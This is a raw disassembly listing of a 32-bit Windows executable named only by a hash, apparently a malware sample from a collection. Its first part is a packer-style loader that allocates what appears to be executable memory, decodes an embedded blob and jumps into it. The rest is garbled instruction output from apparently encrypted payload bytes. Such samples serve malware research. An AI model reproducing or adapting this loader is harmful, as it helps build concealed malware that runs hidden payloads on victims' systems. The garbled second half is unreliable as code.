
c3d94ae9c921b67fdcb2d952a5072d77ca343f29040f9db0e9b834c027b78385.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e0
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291d8
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42900c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429028
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429040
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x429048
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429118
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a0
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429178
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429148
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429120
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x42920c
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429210
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x429214
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429218
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x4291fc
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429200
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x429204
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429208
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x42920a
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291e8
  4112d4:	call   DWORD PTR ds:0x429004
  4112da:	test   eax,eax
  4112dc:	je     0x411324
  4112de:	push   0x0
  4112e0:	push   0x0
  4112e2:	push   0x0
  4112e4:	call   DWORD PTR ds:0x429034
  4112ea:	mov    DWORD PTR [ebp-0x14],eax
  4112ed:	lea    ecx,[ebp-0x40]
  4112f0:	push   ecx
  4112f1:	lea    edx,[ebp-0x10]
  4112f4:	push   edx
  4112f5:	call   DWORD PTR ds:0x429000
  4112fb:	test   eax,eax
  4112fd:	je     0x411324
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	push   0x0
  411318:	push   0x0
  41131a:	mov    edx,DWORD PTR [ebp-0x14]
  41131d:	push   edx
  41131e:	call   DWORD PTR ds:0x42902c
  411324:	mov    BYTE PTR [ebp-0x40],0x56
  411328:	call   DWORD PTR ds:0x429044
  41132e:	mov    DWORD PTR [ebp-0x2c],eax
  411331:	mov    BYTE PTR [ebp-0x3e],0x72
  411335:	movzx  eax,WORD PTR [ebp-0x2c]
  411339:	cmp    eax,0x539
  41133e:	jne    0x411380
  411340:	mov    BYTE PTR [ebp-0x34],0x0
  411344:	mov    DWORD PTR [ebp-0x14],0xe0d
  41134b:	lea    ecx,[ebp-0x28]
  41134e:	push   ecx
  41134f:	call   DWORD PTR ds:0x429024
  411355:	mov    DWORD PTR [ebp-0x60],eax
  411358:	mov    DWORD PTR [ebp-0x54],0x3a
  41135f:	lea    edx,[ebp-0x40]
  411362:	push   edx
  411363:	mov    eax,DWORD PTR [ebp-0x60]
  411366:	push   eax
  411367:	call   DWORD PTR ds:0x429020
  41136d:	mov    DWORD PTR [ebp-0x44],eax
  411370:	mov    DWORD PTR [ebp-0x8],0x22134bce
  411377:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137e:	jmp    0x411395
  411380:	mov    BYTE PTR ds:0x444a58,0x0
  411387:	mov    BYTE PTR ds:0x42cb88,0x0
  41138e:	mov    BYTE PTR ds:0x442b18,0x0
  411395:	mov    DWORD PTR [ebp-0x2c],0x410000
  41139c:	push   DWORD PTR ds:0x429024
  4113a2:	pop    edx
  4113a3:	mov    DWORD PTR [ebp-0x6c],edx
  4113a6:	push   DWORD PTR [ebp-0x30]
  4113a9:	push   0x1000
  4113ae:	mov    eax,DWORD PTR [ebp-0x14]
  4113b1:	add    eax,0x23
  4113b4:	add    eax,0x23
  4113b7:	push   eax
  4113b8:	xor    eax,eax
  4113ba:	push   eax
  4113bb:	mov    ecx,DWORD PTR [ebp-0x44]
  4113be:	call   ecx
  4113c0:	push   eax
  4113c1:	pop    ecx
  4113c2:	mov    DWORD PTR [ebp-0x4],ecx
  4113c5:	mov    ecx,DWORD PTR [ebp-0x68]
  4113c8:	sub    ecx,0xdae0b
  4113ce:	mov    DWORD PTR [ebp-0x68],ecx
  4113d1:	cmp    DWORD PTR [ebp-0x4],0x0
  4113d5:	jne    0x4113de
  4113d7:	mov    BYTE PTR ds:0x442b18,0x0
  4113de:	mov    edx,DWORD PTR [ebp-0x4]
  4113e1:	add    edx,DWORD PTR [ebp-0x14]
  4113e4:	mov    eax,DWORD PTR [ebp-0x8]
  4113e7:	mov    DWORD PTR [edx],eax
  4113e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ec:	add    ecx,DWORD PTR [ebp-0x54]
  4113ef:	mov    DWORD PTR [ebp-0x5c],ecx
  4113f2:	mov    edx,DWORD PTR ds:0x429020
  4113f8:	mov    DWORD PTR [ebp-0x4c],edx
  4113fb:	mov    eax,DWORD PTR [ebp-0x4]
  4113fe:	add    eax,DWORD PTR [ebp-0x14]
  411401:	mov    ecx,DWORD PTR [ebp+0x8]
  411404:	mov    DWORD PTR [eax+0x4],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    DWORD PTR [ebp-0xc],edx
  411410:	cmp    DWORD PTR [ebp-0x68],0x0
  411414:	jbe    0x411431
  411416:	mov    eax,DWORD PTR [ebp-0xc]
  411419:	push   eax
  41141a:	mov    ecx,DWORD PTR [ebp-0x14]
  41141d:	push   ecx
  41141e:	mov    edx,DWORD PTR [ebp-0x2c]
  411421:	add    edx,DWORD PTR [ebp-0x68]
  411424:	push   edx
  411425:	mov    eax,DWORD PTR [ebp-0x4]
  411428:	push   eax
  411429:	call   0x411170
  41142e:	add    esp,0x10
  411431:	cmp    DWORD PTR [ebp-0x5c],0x0
  411435:	je     0x411448
  411437:	push   DWORD PTR [ebp-0x4c]
  41143a:	push   DWORD PTR [ebp-0x6c]
  41143d:	mov    edx,DWORD PTR [ebp-0x5c]
  411440:	push   eax
  411441:	jmp    edx
  411443:	jmp    0x422f1d
  411448:	mov    ecx,DWORD PTR [ebp+0x8]
  41144b:	mov    DWORD PTR [ebp-0x18],ecx
  41144e:	add    al,BYTE PTR ds:0x502bc618
  411454:	add    eax,0xdfcfb259
  411459:	xlat   BYTE PTR ds:[ebx]
  41145a:	pop    esi
  41145b:	test   ebp,ecx
  41145d:	adc    DWORD PTR ds:0xc2fd2a7a,edi
  411463:	cwde   
  411464:	lds    edi,FWORD PTR [edi]
  411466:	(bad)  
  411468:	push   ds
  411469:	mov    ecx,ebx
  41146b:	mov    dl,0x82
  41146d:	jmp    0x41144f
  41146f:	add    ah,al
  411471:	pusha  
  411472:	mov    ebx,0xfac1244d
  411477:	loop   0x41148a
  411479:	xchg   BYTE PTR [edi+eax*4-0x6def60fb],bh
  411480:	mov    edi,0xa9a7357e
  411485:	pop    esi
  411486:	test   BYTE PTR [edx+0x5e],cl
  411489:	mov    bh,0x3e
  41148b:	icebp  
  41148c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41148d:	and    ebx,edi
  41148f:	cmp    eax,0x7566f867
  411494:	lods   eax,DWORD PTR ds:[esi]
  411495:	shl    DWORD PTR [ebp-0x334d0ca0],0x1
  41149c:	test   eax,0x8b80ab0f
  4114a1:	mov    ds:0x3c2a0550,eax
  4114a6:	ds and edi,edx
  4114a9:	push   ds
  4114aa:	iret   
  4114ab:	jo     0x41148a
  4114ad:	(bad)  
  4114ae:	aad    0x49
  4114b0:	adc    eax,0x9fb81e60
  4114b5:	adc    DWORD PTR [edx+0x498a4052],0x78423394
  4114bf:	sbb    edi,DWORD PTR [ecx]
  4114c1:	and    ch,dl
  4114c3:	test   al,0x68
  4114c5:	mov    ebp,0xce030b28
  4114ca:	pop    esi
  4114cb:	fsub   st(2),st
  4114cd:	repz (bad) 
  4114cf:	mov    eax,ds:0x69aca38d
  4114d4:	test   al,cl
  4114d6:	repz cmp bh,al
  4114d9:	aas    
  4114da:	outs   dx,BYTE PTR ds:[esi]
  4114db:	hlt    
  4114dc:	outs   dx,BYTE PTR ds:[esi]
  4114dd:	pop    ecx
  4114de:	repnz or BYTE PTR [ebx+0x52ed5897],dl
  4114e5:	mov    ds:0xc618ce59,al
  4114ea:	cli    
  4114eb:	retf   
  4114ec:	push   cs
  4114ed:	ja     0x41149c
  4114ef:	cwde   
  4114f0:	aam    0xc4
  4114f2:	js     0x4114d2
  4114f4:	(bad)
  4114f7:	xchg   edi,eax
  4114f8:	and    al,0xb3
  4114fa:	sub    al,0xf7
  4114fc:	mov    ebp,0x2f97ecb0
  411501:	loop   0x411499
  411503:	mov    cl,0x24
  411505:	shl    dl,0xaa
  411508:	push   edi
  411509:	and    DWORD PTR [ebx-0x349ca3e5],ecx
  41150f:	mov    ds:0x204c595c,al
  411514:	inc    edi
  411515:	fadd   QWORD PTR [esi+eiz*8+0x5ac331f3]
  41151c:	adc    ecx,DWORD PTR [ebp+0xbc87273]
  411522:	adc    bh,ch
  411524:	pop    eax
  411525:	xor    edx,eax
  411527:	fld1   
  411529:	inc    esp
  41152a:	(bad)  
  41152b:	iret   
  41152c:	sbb    eax,0x40116c26
  411532:	jmp    0xa752c617
  411537:	in     al,0xc1
  411539:	push   es
  41153a:	inc    ebp
  41153b:	inc    esp
  41153c:	mov    dl,0xe7
  41153e:	adc    esi,0xffffffec
  411541:	and    al,dh
  411543:	mov    bl,0xcf
  411545:	out    dx,al
  411546:	fdivr  QWORD PTR [eax]
  411548:	es pop ebx
  41154a:	call   FWORD PTR [ebp-0x3b]
  41154d:	fs jns 0x41156f
  411550:	iret   
  411551:	and    ebp,DWORD PTR [esi]
  411553:	mov    ebp,0x3d836096
  411558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411559:	pop    esi
  41155a:	xlat   BYTE PTR ds:[ebx]
  41155b:	add    DWORD PTR [esi-0x4e5939f9],esi
  411561:	out    0x1b,al
  411563:	push   esp
  411564:	arpl   WORD PTR [edi+0x9],di
  411567:	jmp    0xce876e81
  41156c:	bound  eax,QWORD PTR [ecx-0x9]
  41156f:	mov    WORD PTR [esi+0x41],gs
  411572:	adc    ecx,DWORD PTR [ebx+0x5e]
  411575:	call   0x78bf94d9
  41157a:	mov    al,0xdb
  41157c:	pop    es
  41157d:	jnp    0x41155c
  41157f:	push   0x2b793b6
  411584:	inc    eax
  411585:	sub    dl,0x1e
  411588:	xchg   esi,eax
  411589:	gs cmp eax,eax
  41158c:	rol    al,0x6c
  41158f:	adc    eax,0x9c54626e
  411594:	loop   0x4115f3
  411596:	fwait
  411597:	test   al,0xba
  411599:	test   eax,0xb2fd8c64
  41159e:	loope  0x41159d
  4115a0:	xchg   edx,eax
  4115a1:	jo     0x41161d
  4115a3:	ss test eax,0xe6348e35
  4115a9:	es fsub st(6),st
  4115ac:	ficomp WORD PTR [edi-0x9849372]
  4115b2:	xor    DWORD PTR [ecx],eax
  4115b4:	xchg   ebp,eax
  4115b5:	mov    ebx,0x5b6add34
  4115ba:	and    eax,0xad49e687
  4115bf:	dec    edi
  4115c0:	jg     0x41163b
  4115c2:	fcomp  QWORD PTR [esi*1-0x3c8edf21]
  4115c9:	test   BYTE PTR [esi+ebx*8-0x11],0x8b
  4115ce:	xor    al,BYTE PTR [ebx-0x322ee736]
  4115d4:	adc    cl,cl
  4115d6:	pusha  
  4115d7:	mov    dl,0x77
  4115d9:	jo     0x411625
  4115db:	push   0xffffffee
  4115dd:	and    DWORD PTR ds:0xaf59202a,0x56
  4115e4:	fucomip st,st(7)
  4115e6:	jecxz  0x4115c9
  4115e8:	pop    edi
  4115e9:	popf   
  4115ea:	mov    ebp,0x41244f01
  4115ef:	push   DWORD PTR [ebx+eiz*8]
  4115f2:	dec    esi
  4115f3:	or     DWORD PTR [ebx],esp
  4115f5:	inc    ebp
  4115f6:	repnz xchg ecx,eax
  4115f8:	mov    esp,0xd4ccf572
  4115fd:	jno    0x411658
  4115ff:	dec    ebp
  411600:	inc    esp
  411601:	cmp    al,0x90
  411603:	jp     0x411642
  411605:	out    0x3f,eax
  411607:	cmp    al,0xaa
  411609:	jle    0x4115d9
  41160b:	push   0xffffff8d
  41160d:	outs   dx,DWORD PTR ds:[esi]
  41160e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41160f:	inc    eax
  411610:	scas   eax,DWORD PTR es:[edi]
  411611:	pop    esp
  411612:	fwait
  411613:	js     0x411682
  411615:	iret   
  411616:	js     0x411670
  411618:	mov    edi,0xad840136
  41161d:	(bad)
  411621:	mov    dl,cl
  411623:	pushf  
  411624:	add    esi,ecx
  411626:	leave  
  411627:	neg    BYTE PTR [edi]
  411629:	mov    edx,0x96c8c441
  41162e:	cmp    dl,BYTE PTR [edi+0x7d3e3d4f]
  411634:	add    eax,0x4d26531c
  411639:	mov    ch,BYTE PTR [esp+ebx*2]
  41163c:	adc    esi,DWORD PTR [ebx+0x1ddae0c2]
  411642:	es sti 
  411644:	mov    esi,ecx
  411646:	add    DWORD PTR [ecx+0xd],esp
  411649:	(bad)  
  41164a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41164b:	xlat   BYTE PTR ds:[ebx]
  41164c:	adc    al,0xd7
  41164e:	cmp    DWORD PTR [eax+0x7b1a0110],edi
  411654:	rol    BYTE PTR [edi-0x71],cl
  411657:	adc    al,0x58
  411659:	xchg   esp,eax
  41165a:	ficom  WORD PTR [ebx+ebx*4-0x59]
  41165e:	push   0xbd3f8bd1
  411663:	mov    ebp,0xd8e99bd8
  411668:	pop    es
  411669:	add    al,0xe8
  41166b:	ja     0x41160f
  41166d:	gs jl  0x41166e
  411670:	xchg   edx,eax
  411671:	jnp    0x411651
  411673:	out    dx,al
  411674:	mov    BYTE PTR [ecx+0x54472ce7],ah
  41167a:	mov    ch,0x3f
  41167c:	push   ss
  41167d:	or     bl,ch
  41167f:	and    DWORD PTR [ebx+0x6c],0xffffff85
  411683:	mov    esp,DWORD PTR ds:0xf4413b1f
  411689:	fistp  DWORD PTR [ebp+edi*4-0x35]
  41168d:	push   0xffffffcf
  41168f:	aaa    
  411690:	sub    al,0x99
  411692:	jb     0x41162a
  411694:	mov    dl,0x5c
  411696:	in     eax,dx
  411697:	xchg   esp,edi
  411699:	cmp    al,0xa2
  41169b:	add    al,0xc7
  41169d:	or     DWORD PTR [edx+ebp*1],0x76
  4116a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116a2:	xlat   BYTE PTR ds:[ebx]
  4116a3:	xchg   ebx,eax
  4116a4:	jo     0x41165c
  4116a6:	call   eax
  4116a8:	jns    0x4116cb
  4116aa:	test   cl,0x17
  4116ad:	add    WORD PTR [esi-0x6d],di
  4116b1:	mov    cl,0xc5
  4116b3:	inc    edi
  4116b4:	add    al,0x1c
  4116b6:	inc    BYTE PTR [edi]
  4116b8:	test   al,0xdb
  4116ba:	enter  0x5a8d,0x4e
  4116be:	mov    dh,0xd3
  4116c0:	test   ebx,edx
  4116c2:	rcr    bl,0xca
  4116c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116c6:	jmp    0x5c0d:0x25487fd2
  4116cd:	push   edi
  4116ce:	pusha  
  4116cf:	pop    edx
  4116d0:	xchg   dh,bl
  4116d2:	xlat   BYTE PTR ds:[ebx]
  4116d3:	mov    BYTE PTR [edi+0x5c],dh
  4116d6:	jle    0x4116f1
  4116d8:	imul   esp,DWORD PTR [ebp+0x40],0x7b09aa1f
  4116df:	and    al,0x6a
  4116e1:	xor    al,0x4d
  4116e3:	jecxz  0x4116b5
  4116e5:	push   esi
  4116e6:	jnp    0x41167e
  4116e8:	or     dh,BYTE PTR [edx-0x79]
  4116eb:	jmp    0xf6b71f09
  4116f0:	sub    DWORD PTR [edi+0x145ef666],esp
  4116f6:	shl    DWORD PTR [eax-0xc4c19ce],cl
  4116fc:	mov    ch,0xf2
  4116fe:	icebp  
  4116ff:	test   esi,edi
  411701:	xor    ch,BYTE PTR [eax-0x20f4a247]
  411707:	cwde   
  411708:	outs   dx,BYTE PTR ds:[esi]
  411709:	aad    0x59
  41170b:	fsubr  QWORD PTR [ebx]
  41170d:	inc    edi
  41170e:	push   DWORD PTR [edi+0x2b1e128]
  411714:	sbb    BYTE PTR ds:0x9717ad41,ch
  41171a:	add    esp,eax
  41171c:	xchg   esp,eax
  41171d:	in     al,dx
  41171e:	sahf   
  41171f:	sub    eax,DWORD PTR [edx-0x51]
  411722:	in     al,dx
  411723:	mov    bl,0xf6
  411725:	pop    esi
  411726:	out    0xa9,al
  411728:	jle    0x411707
  41172a:	sub    esp,esi
  41172c:	sbb    ecx,DWORD PTR [ecx]
  41172e:	mov    dh,0x4f
  411730:	pushf  
  411731:	xor    al,0x19
  411733:	ret    
  411734:	jns    0x4116ee
  411736:	push   cs
  411737:	mov    ch,0x82
  411739:	out    0x5b,al
  41173b:	mov    ch,0xb0
  41173d:	not    dh
  41173f:	sub    bh,BYTE PTR [ebx+0x3cd9262]
  411745:	jbe    0x41176a
  411747:	push   esp
  411748:	sub    al,0x48
  41174a:	mov    ebx,0x114c7118
  41174f:	mul    BYTE PTR [ebx+0x6e]
  411752:	ja     0x4117a5
  411754:	xor    DWORD PTR [ebp+edx*2-0x99d8843],ebp
  41175b:	jnp    0x41171c
  41175d:	sub    ah,BYTE PTR [edx-0x11]
  411760:	mov    ds:0xbaca3119,al
  411765:	ficom  WORD PTR [edx]
  411768:	pop    ebx
  411769:	push   ecx
  41176a:	add    DWORD PTR [edi-0x1d],0xc147ca0d
  411771:	shr    DWORD PTR ds:0x8dbb32eb,cl
  411777:	fld    QWORD PTR [ebx]
  411779:	stos   BYTE PTR es:[edi],al
  41177a:	mov    esp,0x50051a2b
  41177f:	out    dx,al
  411780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411781:	push   eax
  411782:	fucomi st,st(3)
  411784:	int3   
  411785:	mov    bl,0x9f
  411787:	mov    DWORD PTR [ecx-0x38],0xb23bc177
  41178e:	sar    bh,1
  411790:	test   eax,0x7e866d2a
  411795:	mov    edx,0xc9a630bb
  41179a:	sbb    eax,0xe80ee908
  41179f:	xor    ebx,DWORD PTR [ecx+0x39]
  4117a2:	inc    ebx
  4117a3:	mov    esp,0x6235adef
  4117a8:	sbb    al,0xa2
  4117aa:	sti    
  4117ab:	cmp    eax,eax
  4117ad:	add    DWORD PTR [ecx+0xe9e0971],eax
  4117b3:	das    
  4117b4:	or     DWORD PTR [edx],esp
  4117b6:	fld    QWORD PTR [ebp+eiz*1+0x7cee21cc]
  4117bd:	xor    al,0x6c
  4117bf:	ins    BYTE PTR es:[edi],dx
  4117c0:	rcl    edi,0x4b
  4117c3:	xchg   DWORD PTR [edi+0x3a],ecx
  4117c6:	add    esi,edx
  4117c8:	or     al,0x2b
  4117ca:	sar    DWORD PTR [edi],cl
  4117cc:	mov    ebp,0xde486caa
  4117d1:	pop    eax
  4117d2:	jmp    0xe8d8bace
  4117d7:	xchg   BYTE PTR [edi],dl
  4117d9:	push   es
  4117da:	jbe    0x411785
  4117dc:	pop    edx
  4117dd:	pop    ds
  4117de:	(bad)  
  4117df:	push   esp
  4117e0:	xchg   ecx,eax
  4117e1:	mov    cl,0x45
  4117e3:	retw   
  4117e5:	xchg   ebx,eax
  4117e6:	xor    eax,0xee7e8397
  4117eb:	sub    DWORD PTR [edi+0x44a5f5b],0xafa86e1a
  4117f5:	aas    
  4117f6:	mov    ah,0x0
  4117f8:	adc    eax,0x70b629fd
  4117fd:	adc    BYTE PTR fs:[edi],cl
  411800:	dec    BYTE PTR [esi+0x34c4fd04]
  411806:	dec    edi
  411807:	loope  0x411831
  411809:	int3   
  41180a:	push   ecx
  41180b:	out    0x70,eax
  41180d:	outs   dx,BYTE PTR ds:[esi]
  41180e:	loope  0x4117ba
  411810:	jb     0x4117cc
  411812:	jecxz  0x4117e4
  411814:	sbb    edx,DWORD PTR [edi]
  411816:	cmc    
  411817:	xchg   ebx,eax
  411818:	ror    BYTE PTR [edi+edi*2+0x26086d3],cl
  41181f:	scas   eax,DWORD PTR es:[edi]
  411820:	cmp    BYTE PTR [edx+0x7e],dh
  411823:	mov    DWORD PTR [ecx],esp
  411825:	inc    ecx
  411826:	sbb    dl,ch
  411828:	push   ds
  411829:	outs   dx,BYTE PTR ds:[esi]
  41182a:	push   es
  41182b:	es ret 0x97c9
  41182f:	xlat   BYTE PTR ds:[ebx]
  411830:	jbe    0x41180a
  411832:	inc    DWORD PTR cs:0x743233a7
  411839:	mov    edx,0x1da590fe
  41183e:	in     al,dx
  41183f:	inc    ecx
  411840:	loope  0x411882
  411842:	daa    
  411843:	mov    esp,0x17dc1cdd
  411848:	bound  ecx,QWORD PTR [esi]
  41184a:	in     al,0xba
  41184c:	jne    0x4117e9
  41184e:	punpcklwd mm4,DWORD PTR [ebx]
  411851:	pop    edx
  411852:	mov    ds:0xf92928a8,al
  411857:	jnp    0x4117fe
  411859:	rcr    DWORD PTR [edi-0x70799a21],1
  41185f:	pushf  
  411860:	push   ebp
  411861:	add    eax,0xbfc1e562
  411866:	cwde   
  411867:	dec    ecx
  411868:	mov    bh,0x52
  41186a:	inc    esi
  41186b:	adc    bh,bl
  41186d:	out    0xe2,eax
  41186f:	pop    eax
  411870:	pop    edi
  411871:	scas   al,BYTE PTR es:[edi]
  411872:	xchg   DWORD PTR [edi],eax
  411874:	mov    ds:0x5fd21bd,eax
  411879:	mov    cl,BYTE PTR [ecx]
  41187b:	js     0x4118d6
  41187d:	dec    ecx
  41187e:	xchg   esp,eax
  41187f:	(bad)  
  411880:	sub    bh,BYTE PTR [edi+0x12b6d222]
  411886:	in     al,0xf5
  411888:	sbb    ah,bl
  41188a:	push   edx
  41188b:	mov    ecx,0x6dffdcf4
  411890:	push   cs
  411891:	aad    0x64
  411893:	mov    BYTE PTR ds:0x5ee94b18,bh
  411899:	cmp    ch,BYTE PTR [eax-0x6b]
  41189c:	and    eax,0x38e1ee84
  4118a1:	dec    ebp
  4118a2:	mov    cs,edi
  4118a4:	les    esi,FWORD PTR [ecx+0x5]
  4118a7:	mov    ds:0x3a3809ed,eax
  4118ac:	pusha  
  4118ad:	or     cl,ah
  4118af:	shl    DWORD PTR [ebx+0x6518be46],0x77
  4118b6:	in     eax,0xc0
  4118b8:	loope  0x4118e9
  4118ba:	mov    dl,0xbd
  4118bc:	xchg   ebx,eax
  4118bd:	pop    ebx
  4118be:	arpl   WORD PTR [edx-0x143a556e],ax
  4118c4:	shl    DWORD PTR [edi-0x8d46762],0x5a
  4118cb:	cmp    al,0x43
  4118ce:	test   BYTE PTR [ebx-0xd1ce245],ah
